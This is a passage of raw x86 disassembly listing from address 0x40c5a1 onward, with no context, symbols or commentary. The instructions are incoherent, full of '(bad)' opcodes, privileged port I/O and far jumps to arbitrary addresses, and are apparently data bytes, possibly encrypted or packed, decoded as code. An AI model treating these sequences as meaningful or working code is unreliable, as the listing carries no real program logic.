  40c5a1:	dec    esi
  40c5a2:	fwait
  40c5a3:	cdq    
  40c5a4:	mov    dh,0x96
  40c5a6:	mov    bh,0xe5
  40c5a8:	jae    0x40c58a
  40c5aa:	fdiv   QWORD PTR [esi-0x15]
  40c5ad:	aaa    
  40c5ae:	push   esi
  40c5af:	dec    edx
  40c5b0:	cmp    dh,BYTE PTR [eax+esi*1+0x60]
  40c5b4:	fcmovu st,st(5)
  40c5b6:	jmp    FWORD PTR [ecx+edx*4-0x22]
  40c5ba:	inc    ebp
  40c5bb:	jb     0x40c5b0
  40c5bd:	ja     0x40c5e4
  40c5bf:	jg     0x40c57e
  40c5c1:	mov    bh,0x82
  40c5c3:	mov    ebx,0xa4092a78
  40c5c8:	js     0x40c5a3
  40c5ca:	ss mov ecx,0x49e13b94
  40c5d0:	pop    ebx
  40c5d1:	lock aaa 
  40c5d3:	sbb    eax,0xd7e31128
  40c5d8:	(bad)  
  40c5d9:	enter  0x3fb0,0x7a
  40c5dd:	push   ecx
  40c5de:	loope  0x40c568
  40c5e0:	xor    ah,BYTE PTR [esi+0x5ab43463]
  40c5e6:	jg     0x40c576
  40c5e8:	lods   al,BYTE PTR ds:[esi]
  40c5e9:	scas   eax,DWORD PTR es:[edi]
  40c5ea:	iret   
  40c5eb:	(bad)  
  40c5ec:	repnz int 0x1b
  40c5ef:	cmp    BYTE PTR [esp-0x32d62a11],dh
  40c5f6:	adc    eax,0x7ecc2a8f
  40c5fb:	xchg   ebp,eax
  40c5fc:	xchg   esp,eax
  40c5fd:	pop    esi
  40c5fe:	adc    BYTE PTR [edx+0x709efaac],ah
  40c604:	dec    edi
  40c605:	test   eax,0x3191b719
  40c60a:	pop    ebx
  40c60b:	mov    bl,0x74
  40c60d:	imul   edi,DWORD PTR ds:0x533a5a7,0xfffffff3
  40c614:	int    0x21
  40c616:	and    al,0x9
  40c618:	iret   
  40c619:	sub    al,0xba
  40c61b:	sub    al,BYTE PTR [ecx+0xa]
  40c61e:	iret   
  40c61f:	mov    ds:0x95f0f051,eax
  40c624:	xchg   DWORD PTR [ebx],edx
  40c626:	pop    ss
  40c627:	mov    edx,0x99a13178
  40c62c:	imul   eax,DWORD PTR [edx+0x57add2af],0xffffff9b
  40c633:	pop    esp
  40c634:	mov    esi,0x56f6c135
  40c639:	xchg   edx,eax
  40c63a:	retf   
  40c63b:	cmp    al,0x5
  40c63d:	pop    ebp
  40c63e:	pushf  
  40c63f:	popf   
  40c640:	les    ebp,FWORD PTR [esi+0x2f]
  40c643:	aaa    
  40c644:	(bad)
  40c648:	aad    0xbc
  40c64a:	inc    ecx
  40c64b:	xchg   esp,eax
  40c64c:	push   cs
  40c64d:	xor    DWORD PTR [edi-0x1859ecd6],0x56e90906
  40c657:	add    DWORD PTR [ecx],ecx
  40c659:	push   ds
  40c65a:	jg     0x40c670
  40c65c:	sub    al,0xd3
  40c65e:	mov    cl,0xd8
  40c660:	dec    ecx
  40c661:	and    al,0x9d
  40c663:	jbe    0x40c61a
  40c665:	sbb    edi,DWORD PTR [ebx-0x17022437]
  40c66b:	mov    bh,0xd
  40c66d:	sub    eax,0x204ddc7b
  40c672:	mov    cl,0x14
  40c674:	call   0x493da0c6
  40c679:	sub    eax,0x2415fe4a
  40c67e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c67f:	and    BYTE PTR [edx+eiz*1],dh
  40c682:	ret    
  40c683:	out    0x6c,al
  40c685:	inc    edi
  40c686:	pop    ebx
  40c687:	or     al,0xd0
  40c689:	adc    al,0xd2
  40c68b:	popa   
  40c68c:	loopne 0x40c709
  40c68e:	pop    ecx
  40c68f:	mov    dl,0x5a
  40c691:	inc    esp
  40c692:	fild   WORD PTR [esi]
  40c694:	les    esp,FWORD PTR [esi-0x3598b49d]
  40c69a:	in     al,0x70
  40c69c:	mov    ah,0xf
  40c69e:	rcr    DWORD PTR [esp+edx*4],1
  40c6a1:	loopne 0x40c6c5
  40c6a3:	outs   dx,BYTE PTR ds:[esi]
  40c6a4:	mov    ebx,DWORD PTR [esi]
  40c6a6:	sub    BYTE PTR [ebx+0x514bcdd8],0xe7
  40c6ad:	rcr    DWORD PTR [eax],1
  40c6af:	inc    ebp
  40c6b0:	push   DWORD PTR [edx+0x41]
  40c6b3:	daa    
  40c6b4:	ficom  DWORD PTR [esi-0x20]
  40c6b7:	or     esi,DWORD PTR [esi]
  40c6b9:	retf   
  40c6ba:	hlt    
  40c6bb:	mov    cl,0x5b
  40c6bd:	sbb    bh,cl
  40c6bf:	mov    al,bl
  40c6c1:	xchg   ebp,eax
  40c6c2:	mov    eax,ds:0xec0a4e10
  40c6c7:	cmp    eax,0xc9bcada3
  40c6cc:	shr    dh,cl
  40c6ce:	test   al,0xa1
  40c6d0:	and    ch,BYTE PTR [edx]
  40c6d2:	adc    al,0xfe
  40c6d4:	stos   DWORD PTR es:[edi],eax
  40c6d5:	xchg   edx,eax
  40c6d6:	mov    esi,0x6cd41f0e
  40c6db:	les    esi,FWORD PTR [eax+ebx*1+0x53]
  40c6df:	fwait
  40c6e0:	lds    ebp,FWORD PTR [esi+eiz*2-0x5]
  40c6e4:	rol    ebx,cl
  40c6e6:	fdivr  DWORD PTR [edx]
  40c6e8:	pop    ebp
  40c6e9:	sbb    BYTE PTR [esi-0x11],0x57
  40c6ed:	sub    esp,DWORD PTR [ebp-0x7]
  40c6f0:	inc    ebx
  40c6f1:	jmp    0xc109:0x25066363
  40c6f8:	cmp    eax,0xda63957c
  40c6fd:	lods   al,BYTE PTR ds:[esi]
  40c6fe:	mov    esp,0xfc957f44
  40c703:	out    dx,al
  40c704:	pop    esp
  40c705:	xlat   BYTE PTR ds:[ebx]
  40c706:	retfw  0x4199
  40c70a:	push   ss
  40c70b:	pop    ebp
  40c70c:	sbb    BYTE PTR [esi],ah
  40c70e:	sbb    BYTE PTR [esi+0x57a71c4c],al
  40c714:	and    cl,al
  40c716:	fs enter 0xf72f,0x21
  40c71b:	out    0xb8,eax
  40c71d:	ret    0x6db9
  40c720:	add    al,0xfc
  40c722:	lds    esi,FWORD PTR [edi+ebx*8]
  40c725:	push   es
  40c726:	imul   DWORD PTR cs:[esi+0x22]
  40c72a:	xchg   esp,eax
  40c72b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c72c:	stc    
  40c72d:	jb     0x40c6d1
  40c72f:	mov    dl,0x58
  40c731:	in     al,dx
  40c732:	sub    BYTE PTR [edi-0x1bb8bae9],al
  40c738:	xchg   edi,ebp
  40c73a:	jbe    0x40c775
  40c73c:	gs add al,0x55
  40c73f:	ss sti 
  40c741:	adc    DWORD PTR [ebp-0x2e6d33ae],edx
  40c747:	cs jecxz 0x40c755
  40c74a:	ret    
  40c74b:	xchg   edi,eax
  40c74c:	jge    0x40c740
  40c74e:	jle    0x40c70c
  40c750:	fbld   TBYTE PTR [esi-0x5e]
  40c753:	add    BYTE PTR [ecx],bh
  40c755:	out    0x69,eax
  40c757:	pop    edx
  40c758:	adc    eax,ecx
  40c75a:	nop
  40c75b:	sbb    al,0xdd
  40c75d:	aaa    
  40c75e:	ins    BYTE PTR es:[edi],dx
  40c75f:	repz cli 
  40c761:	dec    ebx
  40c762:	in     eax,dx
  40c763:	popa   
  40c764:	cmc    
  40c765:	(bad)  
  40c766:	inc    ebx
  40c767:	jge    0x40c7d8
  40c769:	stc    
  40c76a:	sub    esp,esi
  40c76c:	ss retf 
  40c76e:	sbb    edx,edi
  40c770:	cwde   
  40c771:	push   0xffffffa6
  40c773:	scas   eax,DWORD PTR es:[edi]
  40c774:	sub    ah,BYTE PTR [edx]
  40c776:	and    al,0x5d
  40c778:	mul    BYTE PTR [edi]
  40c77a:	ins    BYTE PTR es:[edi],dx
  40c77b:	pop    ebp
  40c77c:	inc    edi
  40c77d:	lahf   
  40c77e:	cmp    eax,0x9fdfbf44
  40c783:	(bad)  
  40c785:	push   0x7f618a1a
  40c78a:	lods   al,BYTE PTR ds:[esi]
  40c78b:	push   ebx
  40c78c:	push   cs
  40c78d:	test   BYTE PTR [edi],0xf5
  40c790:	rep stos BYTE PTR es:[edi],al
  40c792:	jp     0x40c7ab
  40c794:	xor    al,0x5c
  40c796:	jecxz  0x40c78e
  40c798:	into   
  40c799:	jl     0x40c7a7
  40c79b:	cmp    bh,bl
  40c79d:	jne    0x40c7d9
  40c79f:	int    0xb4
  40c7a1:	xchg   esi,eax
  40c7a2:	ss sahf 
  40c7a4:	(bad)  
  40c7a5:	lods   eax,DWORD PTR ds:[esi]
  40c7a6:	outs   dx,BYTE PTR ds:[esi]
  40c7a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7a8:	in     eax,dx
  40c7a9:	inc    ebx
  40c7aa:	leave  
  40c7ab:	in     eax,dx
  40c7ac:	mov    edi,0x21164a80
  40c7b1:	fidivr WORD PTR [edi]
  40c7b3:	jge    0x40c77b
  40c7b5:	aad    0x4e
  40c7b7:	sbb    DWORD PTR [edx],eax
  40c7b9:	lock call 0x357f9b0d
  40c7bf:	or     bh,cl
  40c7c1:	adc    esi,DWORD PTR [ebp-0x3e]
  40c7c4:	lea    edi,[edx]
  40c7c6:	inc    edx
  40c7c7:	mov    al,0x85
  40c7c9:	dec    edx
  40c7ca:	mov    edi,0xf2613f72
  40c7cf:	imul   ebp,edx,0xffffffdd
  40c7d2:	fdivr  st,st(4)
  40c7d4:	inc    edx
  40c7d5:	ins    BYTE PTR es:[edi],dx
  40c7d6:	push   edx
  40c7d7:	cmc    
  40c7d8:	pop    esi
  40c7d9:	inc    ebp
  40c7da:	arpl   WORD PTR [esi+0x64],si
  40c7dd:	pop    eax
  40c7de:	ret    0x9c2d
  40c7e1:	inc    ecx
  40c7e2:	jmp    0xc444:0xfd13e30e
  40c7e9:	xor    eax,DWORD PTR [eax]
  40c7eb:	cmp    DWORD PTR [edx-0x6],edx
  40c7ee:	push   edi
  40c7ef:	scas   eax,DWORD PTR es:[edi]
  40c7f0:	mov    WORD PTR [edi-0x4a],gs
  40c7f3:	cdq    
  40c7f4:	cmp    edx,DWORD PTR [esi-0x149c2afa]
  40c7fa:	loope  0x40c873
  40c7fc:	bound  esi,QWORD PTR [ebp+0x51c16914]
  40c802:	cdq    
  40c803:	adc    esp,DWORD PTR [ebp+edx*4-0x5826d809]
  40c80a:	sbb    BYTE PTR [ecx],ch
  40c80c:	adc    eax,0x1bed177
  40c811:	aad    0x57
  40c813:	mov    bl,0xb1
  40c815:	ss mov ebp,0xc1043e21
  40c81b:	xor    edi,DWORD PTR [ebp+edx*8+0x46]
  40c81f:	popf   
  40c820:	retf   0x5a82
  40c823:	sub    al,0xe5
  40c825:	imul   eax,DWORD PTR [edx+0x20],0x5e2a4ad6
  40c82c:	mov    edx,0x719a8d2d
  40c831:	jmp    0x20173541
  40c836:	cmp    DWORD PTR [edi-0x24],ebx
  40c839:	hlt    
  40c83a:	inc    eax
  40c83b:	and    DWORD PTR [ebp-0x7a],edx
  40c83e:	icebp  
  40c83f:	cmp    ecx,DWORD PTR [ebx-0x54]
  40c842:	lea    ebp,[edx]
  40c844:	das    
  40c845:	fcom   DWORD PTR [esi+eiz*2]
  40c848:	fsincos 
  40c84a:	psrad  mm0,QWORD PTR [ebx+0x6a]
  40c84e:	out    0xe9,eax
  40c850:	dec    edx
  40c851:	xchg   esp,eax
  40c853:	cmp    ebx,edx
  40c855:	hlt    
  40c856:	shl    al,cl
  40c858:	mov    esp,0x2ac994d
  40c85d:	xchg   ebx,eax
  40c85e:	clc    
  40c85f:	into   
  40c860:	outs   dx,DWORD PTR ds:[esi]
  40c861:	cmp    esi,DWORD PTR [ecx+0x15bff768]
  40c867:	xchg   ecx,eax
  40c868:	and    eax,0xd97c1801
  40c86d:	sti    
  40c86e:	sub    al,0x9d
  40c870:	aas    
  40c871:	or     DWORD PTR [ebp-0x3106f14b],ecx
  40c877:	(bad)  
  40c878:	in     al,0x66
  40c87a:	dec    edi
  40c87b:	stc    
  40c87c:	stc    
  40c87d:	aam    0x15
  40c87f:	rcr    DWORD PTR [ebx-0x13],cl
  40c882:	pop    ds
  40c883:	push   edx
  40c884:	pop    ebp
  40c885:	test   ebp,ebx
  40c887:	mov    ebp,0xd4b8b873
  40c88c:	mov    edx,0x3239c83f
  40c891:	and    BYTE PTR [ecx+0x4a],ch
  40c894:	xchg   ebp,eax
  40c895:	xor    ch,BYTE PTR [ecx-0xd]
  40c898:	imul   ecx,ecx,0xaac966a
  40c89e:	xchg   esp,eax
  40c89f:	lods   eax,DWORD PTR ds:[esi]
  40c8a0:	and    al,0x9d
  40c8a2:	mov    bh,0xe7
  40c8a4:	and    dl,BYTE PTR [esi-0x12]
  40c8a7:	xor    eax,0xabb0d10c
  40c8ac:	outs   dx,BYTE PTR ds:[esi]
  40c8ad:	pushf  
  40c8ae:	das    
  40c8af:	js     0x40c8dd
  40c8b1:	lock lods eax,DWORD PTR ds:[esi]
  40c8b3:	mov    ebp,0xec8fbe21
  40c8b8:	push   ds
  40c8b9:	adc    DWORD PTR [esi+0x26],0xffffffbb
  40c8bd:	lock xchg ebx,eax
  40c8bf:	pop    eax
  40c8c0:	dec    ebp
  40c8c1:	idiv   DWORD PTR [esi+0x6]
  40c8c4:	in     eax,0xa4
  40c8c6:	pop    edx
  40c8c7:	adc    DWORD PTR ds:0x430777d6,edi
  40c8cd:	jbe    0x40c885
  40c8cf:	test   al,0x7c
  40c8d1:	popa   
  40c8d2:	cmp    DWORD PTR [ebx+0x5e],esi
  40c8d5:	xchg   ecx,eax
  40c8d6:	aad    0xba
  40c8d8:	ja     0x40c957
  40c8da:	(bad)  
  40c8db:	ja     0x40c882
  40c8dd:	dec    ebx
  40c8de:	adc    BYTE PTR [edi+ebp*1],ah
  40c8e1:	xor    eax,0x3fe8a450
  40c8e6:	popa   
  40c8e7:	call   0xb77c3021
  40c8ec:	xor    DWORD PTR [ebx+0x42],edi
  40c8ef:	dec    DWORD PTR [esi+0x23]
  40c8f2:	cdq    
  40c8f3:	sbb    ebp,DWORD PTR ds:0x4c994b8a
  40c8f9:	inc    eax
  40c8fa:	xor    bh,dh
  40c8fc:	pop    edi
  40c8fd:	add    al,0xdf
  40c8ff:	ss cli 
  40c901:	add    DWORD PTR [esi+eax*2],ecx
  40c904:	push   0x72
  40c906:	push   0x9
  40c908:	(bad)  
  40c909:	in     al,dx
  40c90a:	cmp    DWORD PTR ds:0x7e388a80,0xffffffac
  40c911:	xor    bl,cl
  40c913:	cmp    ebx,edx
  40c915:	jno    0x40c986
  40c917:	cmp    DWORD PTR [ebx+0x1e],edx
  40c91a:	add    al,0x1b
  40c91c:	xchg   BYTE PTR [ecx+0x2d],ch
  40c91f:	pop    ebx
  40c920:	test   DWORD PTR [ebx-0x72],0x401f435b
  40c927:	xor    al,0xda
  40c929:	test   DWORD PTR ds:0xbf07753a,edi
  40c92f:	pop    ds
  40c930:	retf   0x4ea6
  40c933:	(bad)  
  40c934:	daa    
  40c935:	xchg   ecx,eax
  40c936:	cmc    
  40c937:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c938:	out    dx,eax
  40c939:	push   edi
  40c93a:	sar    DWORD PTR [ecx],cl
  40c93c:	mov    eax,ds:0xb02ffbdf
  40c941:	test   al,0x8d
  40c943:	mov    eax,ds:0xef28f103
  40c948:	adc    esi,DWORD PTR [eax]
  40c94a:	sti    
  40c94b:	ret    
  40c94c:	jg     0x40c8f5
  40c94e:	pop    ebp
  40c94f:	frstor [eax]
  40c951:	je     0x40c97c
  40c953:	aam    0xd9
  40c955:	jmp    FWORD PTR [eax+ecx*2]
  40c958:	jo     0x40c91f
  40c95a:	(bad)  
  40c95b:	dec    edx
  40c95c:	add    BYTE PTR [esi],cl
  40c95e:	outs   dx,BYTE PTR ds:[esi]
  40c95f:	inc    ebp
  40c960:	test   BYTE PTR [ebx],cl
  40c962:	jne    0x40c993
  40c964:	mov    ch,0xc8
  40c966:	cmp    DWORD PTR [eax],esi
  40c968:	int    0xdd
  40c96a:	xchg   edx,eax
  40c96b:	addr16 jg 0x40c9cd
  40c96e:	xchg   ebx,eax
  40c96f:	push   esi
  40c970:	test   eax,0xe4008673
  40c975:	lea    ebx,[edi+0x2b]
  40c978:	icebp  
  40c979:	ret    0x97a
  40c97c:	call   0xa36d:0x6b41895f
  40c983:	and    dl,dh
  40c985:	sub    al,ah
  40c987:	iret   
  40c988:	jge    0x40c94b
  40c98a:	push   cs
  40c98b:	sub    eax,0x5f995431
  40c990:	daa    
  40c991:	aam    0x84
  40c993:	hlt    
  40c994:	jg     0x40ca04
  40c996:	inc    eax
  40c997:	repz loop 0x40c987
  40c99a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c99b:	into   
  40c99c:	clc    
  40c99d:	or     eax,0xfeb087c2
  40c9a2:	or     eax,0x82c60434
  40c9a7:	pcmpeqw mm1,QWORD PTR [ecx]
  40c9aa:	inc    ecx
  40c9ab:	adc    al,0xa4
  40c9ad:	or     ch,BYTE PTR [ebx+0x7f6e6980]
  40c9b3:	xor    BYTE PTR [edi-0x53a4eece],dl
  40c9b9:	ja     0x40ca14
  40c9bb:	sbb    BYTE PTR [edx],0x20
  40c9be:	loopne 0x40ca1a
  40c9c0:	and    al,0xe0
  40c9c2:	mov    esi,0x4bfd5f4b
  40c9c7:	push   ecx
  40c9c8:	call   0xf752:0xb7d52041
  40c9cf:	jge    0x40ca27
  40c9d1:	loope  0x40c992
  40c9d3:	add    eax,0xb61a2c3d
  40c9d8:	hlt    
  40c9d9:	mov    ecx,0xe017867d
  40c9de:	aaa    
  40c9df:	arpl   WORD PTR [ecx],sp
  40c9e1:	mov    bh,0x2b
  40c9e3:	setl   BYTE PTR [eax]
  40c9e6:	push   esi
  40c9e7:	fstp   QWORD PTR [esi+0x2d49b259]
  40c9ed:	repnz xchg edx,eax
  40c9ef:	cmp    eax,0xfce8a325
  40c9f4:	(bad)  
  40c9f5:	push   0xffffffd3
  40c9f7:	outs   dx,BYTE PTR ds:[esi]
  40c9f8:	out    dx,eax
  40c9f9:	push   ebp
  40c9fa:	sbb    ch,BYTE PTR [eax+eiz*1]
  40c9fd:	cli    
  40c9fe:	jae    0x40ca07
  40ca00:	pop    ds
  40ca01:	jbe    0x40c994
  40ca03:	inc    edi
  40ca04:	inc    eax
  40ca05:	faddp  st(7),st
  40ca07:	jcxz   0x40ca64
  40ca0a:	ins    DWORD PTR es:[edi],dx
  40ca0b:	ja     0x40ca05
  40ca0d:	dec    esi
  40ca0e:	rcl    BYTE PTR ds:0xd927b86a,0xd1
  40ca15:	cwde   
  40ca16:	aaa    
  40ca17:	call   0x22aaa5c7
  40ca1c:	jno    0x40ca76
  40ca1e:	or     BYTE PTR [ebx+edi*8-0x73],ah
  40ca22:	jmp    0x5557:0x9bd13b90
  40ca29:	data16 sahf 
  40ca2b:	cmp    ch,BYTE PTR [edi+0x18]
  40ca2e:	or     ah,BYTE PTR [ebx-0x44d9bda8]
  40ca34:	or     DWORD PTR [ecx],0x40
  40ca37:	enter  0x546,0x78
  40ca3b:	xchg   DWORD PTR [esi],ebx
  40ca3d:	in     al,dx
  40ca3e:	dec    edx
  40ca3f:	ins    DWORD PTR es:[edi],dx
  40ca40:	mov    al,ds:0x551d51b
  40ca45:	xor    eax,0xf68826c5
  40ca4a:	adc    ecx,DWORD PTR [ebp+0x37]
  40ca4d:	inc    eax
  40ca4e:	xlat   BYTE PTR ds:[ebx]
  40ca4f:	loope  0x40ca13
  40ca51:	fst    QWORD PTR [edi]
  40ca53:	outs   dx,BYTE PTR ds:[esi]
  40ca54:	imul   ebp,DWORD PTR [edx],0xffffff8d
  40ca57:	xor    ebp,DWORD PTR [ebx+0xafdf660]
  40ca5d:	call   0xb52e8882
  40ca62:	sbb    BYTE PTR [esi],ch
  40ca64:	lods   al,BYTE PTR ds:[esi]
  40ca65:	add    al,BYTE PTR [edx]
  40ca67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca68:	xchg   edx,eax
  40ca69:	jne    0x40cad9
  40ca6b:	mov    ah,0xff
  40ca6d:	push   edi
  40ca6e:	mov    WORD PTR [eax-0x12e2a3ee],?
  40ca74:	out    0x99,eax
  40ca76:	ins    DWORD PTR es:[edi],dx
  40ca77:	mov    dl,0xa2
  40ca79:	inc    ebx
  40ca7a:	mov    ds:0xc34fb7ef,eax
  40ca7f:	test   al,0x3
  40ca81:	clc    
  40ca82:	mov    bh,0x3f
  40ca84:	ins    BYTE PTR es:[edi],dx
  40ca85:	cld    
  40ca86:	rcl    ch,cl
  40ca88:	mov    al,0x8c
  40ca8a:	imul   eax,DWORD PTR [esi+edx*4+0x48dfcd47],0x927c1d2c
  40ca95:	add    ebp,DWORD PTR [edx+0x49cc0874]
  40ca9b:	pop    edi
  40ca9c:	cdq    
  40ca9d:	in     eax,0xb4
  40ca9f:	jg     0x40ca98
  40caa1:	push   ebp
  40caa2:	mov    BYTE PTR [ebp+0x24],ah
  40caa5:	dec    eax
  40caa6:	fcom   st(5)
  40caa8:	pop    esp
  40caa9:	in     al,dx
  40caaa:	inc    ebx
  40caab:	xor    ebx,0x35
  40caae:	jl     0x40ca38
  40cab0:	rcl    BYTE PTR [ebp+esi*1-0x75],0x57
  40cab5:	fs and al,0x7e
  40cab8:	and    BYTE PTR [ebx-0x614e58c4],bh
  40cabe:	leave  
  40cabf:	scas   eax,DWORD PTR es:[edi]
  40cac0:	clc    
  40cac1:	sub    BYTE PTR [ebp-0x6e133a58],ch
  40cac7:	mov    ds:0xda2c068f,al
  40cacc:	pop    edx
  40cacd:	mov    ah,0x77
  40cacf:	pop    ss
  40cad0:	mov    ebx,0xc0b8a7d5
  40cad5:	stc    
  40cad6:	push   eax
  40cad7:	mov    cl,0x3d
  40cad9:	push   edx
  40cada:	push   cs
  40cadb:	sub    ebp,DWORD PTR [ecx+0x4]
  40cade:	cld    
  40cadf:	cwde   
  40cae0:	ins    BYTE PTR es:[edi],dx
  40cae1:	mov    esp,eax
  40cae3:	(bad)  
  40cae4:	sbb    eax,0xbbfc6896
  40cae9:	mov    DWORD PTR [edi-0x80],ecx
  40caec:	push   esp
  40caed:	xchg   bl,dl
  40caef:	pop    ebx
  40caf0:	xor    esi,eax
  40caf2:	(bad)  
  40caf3:	jo     0x40cb1e
  40caf5:	(bad)  [ebp-0x7]
  40caf8:	fisubr DWORD PTR [edi+0x287e995a]
  40cafe:	shl    BYTE PTR [ecx-0x54],cl
  40cb01:	inc    edx
  40cb02:	cmp    bh,cl
  40cb04:	lock sub cl,BYTE PTR [ecx]
  40cb07:	push   es
  40cb08:	pop    eax
  40cb09:	mov    cl,0x2
  40cb0b:	cmc    
  40cb0c:	xchg   esi,eax
  40cb0d:	je     0x40cb59
  40cb0f:	(bad)  
  40cb10:	not    BYTE PTR [esp+eiz*8]
  40cb13:	xor    al,0x39
  40cb15:	cmp    dh,bl
  40cb17:	xlat   BYTE PTR ds:[ebx]
  40cb18:	push   eax
  40cb19:	std    
  40cb1a:	hlt    
  40cb1b:	pop    esp
  40cb1c:	push   ds
  40cb1d:	shl    DWORD PTR [ecx+edi*1],1
  40cb20:	inc    ebp
  40cb21:	std    
  40cb22:	jmp    0x40cb3c
  40cb24:	jge    0x40cb05
  40cb26:	xlat   BYTE PTR ds:[ebx]
  40cb27:	js     0x40cb19
  40cb29:	leave  
  40cb2a:	dec    esi
  40cb2b:	in     al,dx
  40cb2c:	ins    BYTE PTR es:[edi],dx
  40cb2d:	add    bl,dh
  40cb2f:	in     al,dx
  40cb30:	xchg   ecx,eax
  40cb31:	test   al,0xfc
  40cb33:	call   0x6c1e8c71
  40cb38:	lahf   
  40cb39:	xchg   edx,eax
  40cb3a:	push   ebp
  40cb3b:	fsub   DWORD PTR [ebp-0x75]
  40cb3e:	push   0xfffffff8
  40cb40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb41:	loope  0x40cb5f
  40cb43:	call   0xcd2fc14a
  40cb48:	jge    0x40cb86
  40cb4a:	mov    eax,?
  40cb4c:	stos   BYTE PTR es:[edi],al
  40cb4d:	xor    BYTE PTR [ebx-0xcd7ea5e],0x50
  40cb54:	scas   eax,DWORD PTR es:[edi]
  40cb55:	fcomp  QWORD PTR [edx]
  40cb57:	push   esp
  40cb58:	(bad)  
  40cb5a:	dec    BYTE PTR [ebp+0x37]
  40cb5d:	popf   
  40cb5e:	and    ch,BYTE PTR [ecx-0x71]
  40cb61:	cdq    
  40cb62:	xor    DWORD PTR [ebp+0x624d3e4f],0x55
  40cb69:	xor    al,0x71
  40cb6b:	sbb    cl,cl
  40cb6d:	mov    al,0xb1
  40cb6f:	(bad)  
  40cb70:	rcl    DWORD PTR [ebx],1
  40cb72:	cli    
  40cb73:	dec    edi
  40cb74:	jo     0x40cb17
  40cb76:	div    DWORD PTR [edi+0x1f]
  40cb79:	mov    bl,BYTE PTR [edi+0x3e]
  40cb7c:	xchg   esi,eax
  40cb7d:	enter  0xe030,0xdf
  40cb81:	popf   
  40cb82:	out    dx,eax
  40cb83:	xchg   bp,ax
  40cb85:	les    edi,FWORD PTR [ebx]
  40cb87:	push   ebp
  40cb88:	sahf   
  40cb89:	and    al,0x7f
  40cb8b:	add    ebp,DWORD PTR [ebx+0x51560a36]
  40cb91:	sub    bl,dh
  40cb93:	fwait
  40cb94:	dec    esi
  40cb95:	in     al,0x36
  40cb97:	or     ah,BYTE PTR [ebp-0x23]
  40cb9a:	cli    
  40cb9b:	(bad)  
  40cb9c:	jecxz  0x40cbfa
  40cb9e:	inc    esi
  40cb9f:	arpl   WORD PTR [edi-0x42],si
  40cba2:	les    ebp,FWORD PTR [esi-0xa47f674]
  40cba8:	mov    eax,0xd4c524f0
  40cbad:	pushf  
  40cbae:	sti    
  40cbaf:	sub    eax,0xb19a83a9
  40cbb4:	stos   DWORD PTR es:[edi],eax
  40cbb5:	(bad)  
  40cbb6:	test   al,0x95
  40cbb8:	xchg   DWORD PTR [eax],esp
  40cbba:	iret   
  40cbbb:	mov    WORD PTR [eax],es
  40cbbd:	into   
  40cbbe:	cmc    
  40cbbf:	add    esi,DWORD PTR [eax]
  40cbc1:	in     eax,0x4d
  40cbc3:	aam    0xff
  40cbc5:	push   eax
  40cbc6:	xor    BYTE PTR [edi-0x5c207165],al
  40cbcc:	sub    eax,0x264e7d08
  40cbd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbd2:	gs scas eax,DWORD PTR es:[edi]
  40cbd4:	in     eax,0x67
  40cbd6:	loop   0x40cb7d
  40cbd8:	xchg   BYTE PTR [ecx+0x5269e2dc],cl
  40cbde:	sbb    ah,BYTE PTR ss:[eax-0x32c44582]
  40cbe5:	clc    
  40cbe6:	(bad)  
  40cbe7:	push   esi
  40cbe8:	(bad)  
  40cbea:	xlat   BYTE PTR ds:[ebx]
  40cbeb:	sub    al,0xa1
  40cbed:	int3   
  40cbee:	mov    eax,ds:0xbad0e2f7
  40cbf4:	iret   
  40cbf5:	lods   eax,DWORD PTR ds:[esi]
  40cbf6:	aam    0xfb
  40cbf8:	mov    ds:0x2430bce2,eax
  40cbfd:	mov    bl,0x82
  40cbff:	arpl   WORD PTR [edi],si
  40cc01:	es xchg esi,eax
  40cc03:	pusha  
  40cc04:	pop    esi
  40cc05:	add    DWORD PTR [ebx-0x4cbabe57],0xce7149d
  40cc0f:	dec    ebx
  40cc10:	stos   BYTE PTR es:[edi],al
  40cc11:	les    edi,FWORD PTR [ebx+eiz*4-0x8]
  40cc15:	jne    0x40cc96
  40cc17:	sub    DWORD PTR [ebp-0xfd090fd],ebx
  40cc1d:	pop    ss
  40cc1e:	(bad)  
  40cc1f:	mov    al,ds:0xa4b20e75
  40cc24:	retf   
  40cc25:	js     0x40cc2d
  40cc27:	add    al,0xa0
  40cc29:	xchg   esp,eax
  40cc2a:	stos   BYTE PTR es:[edi],al
  40cc2b:	mov    ah,BYTE PTR [edi+0x55034d41]
  40cc31:	icebp  
  40cc32:	dec    esp
  40cc33:	lahf   
  40cc34:	sbb    ah,0xe5
  40cc37:	jecxz  0x40ccb4
  40cc39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc3a:	gs popf 
  40cc3c:	jb     0x40cc34
  40cc3e:	pop    ebx
  40cc3f:	xor    eax,0x956e2fa8
  40cc44:	clc    
  40cc45:	fldenv ds:0x30395d7d
  40cc4b:	mov    dh,0x7e
  40cc4d:	aad    0x14
  40cc4f:	repz pop ss
  40cc51:	mov    al,ds:0xc34700ae
  40cc56:	cmp    DWORD PTR [edx+0x5ff61bc1],ebx
  40cc5c:	enter  0x7752,0x1
  40cc60:	mov    ah,0x7b
  40cc62:	mov    DWORD PTR [esi],ecx
  40cc64:	in     eax,dx
  40cc65:	or     ch,cl
  40cc67:	xchg   ebp,eax
  40cc68:	jb     0x40cc2c
  40cc6a:	jne    0x40cc44
  40cc6c:	inc    si
  40cc6e:	clc    
  40cc6f:	sub    esp,DWORD PTR [ebx+ebx*2-0x6a]
  40cc73:	retf   
  40cc74:	pop    ebp
  40cc75:	xor    BYTE PTR [ecx-0x217ba3fa],0xd3
  40cc7c:	data16 cmp ch,BYTE PTR [ebx]
  40cc7f:	in     al,0x21
  40cc81:	popa   
  40cc82:	xor    BYTE PTR [ebp-0x7d],ah
  40cc85:	out    0x80,eax
  40cc87:	fidivr WORD PTR ds:0xd5d0d61
  40cc8d:	not    BYTE PTR [ebx-0x3cd25b0d]
  40cc93:	cdq    
  40cc94:	outs   dx,DWORD PTR ds:[esi]
  40cc95:	fbstp  TBYTE PTR [edx]
  40cc97:	fwait
  40cc98:	aaa    
  40cc99:	sti    
  40cc9a:	jo     0x40ccfb
